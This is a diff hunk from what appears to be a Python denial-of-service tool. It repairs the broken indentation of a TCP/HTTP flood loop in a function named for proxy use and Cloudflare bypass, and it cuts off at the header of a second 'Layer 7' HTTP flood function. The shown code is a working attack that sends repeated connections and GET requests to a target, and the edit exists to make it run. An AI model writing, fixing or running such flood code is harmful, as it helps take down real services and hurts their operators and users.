@@ -94,15 +94,16 @@ def tcp_flood_with_proxy_and_cf_bypass(target_ip, target_port, duration):
  "https": proxy,
  }
  while duration > 0:
-     try:
-         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-         s.connect((target_ip, target_port))
-          s.sendto(("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
-           s.close()
-             except Exception as e:
-             print(f"TCP Flood Error: {e}")
-              duration -= 1
-              time.sleep(1 / requests_per_second)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip, target_port))
+        s.sendto(("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
+        s.close()
+    except Exception as e:
+        print(f"Error: {e}")
+
+    duration -= 1
+    time.sleep(1 / requests_per_second)
 
 # Layer 7 (HTTP) Attack with Proxy and Cloudflare Bypass
 def http_flood_with_proxy_and_cf_bypass(target_ip, target_port, duration):
